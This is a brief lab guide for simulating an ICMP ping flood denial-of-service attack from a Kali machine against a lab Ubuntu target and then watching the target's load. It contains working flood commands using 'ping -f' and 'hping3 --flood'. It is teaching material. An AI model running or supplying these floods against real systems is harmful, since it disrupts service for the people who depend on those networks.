# DoS Ping Flood Lab

## Objective
Simulate a ping flood attack on a lab network and observe its impact.

## Requirements
- Attacker machine: Kali Linux
- Target machine: Ubuntu/Debian
- Tools: ping / hping3

## Steps
1. **Check connectivity**
   $bash
   ping -c 4 <target-ip>

2. **Simulate attack with ping**
    ping -f <target-ip>
    (The -f flag sends packets as fast as possible.)

3. **Simulate with hping3**
    $bash
    sudo hping3 -1 --flood -V <target-ip>

4. **Monitor target performance**
    On target machine:
        $bash
        top
        iftop
        dmesg

5. **Stop the attack**
    Ctrl + C on attacker terminal.
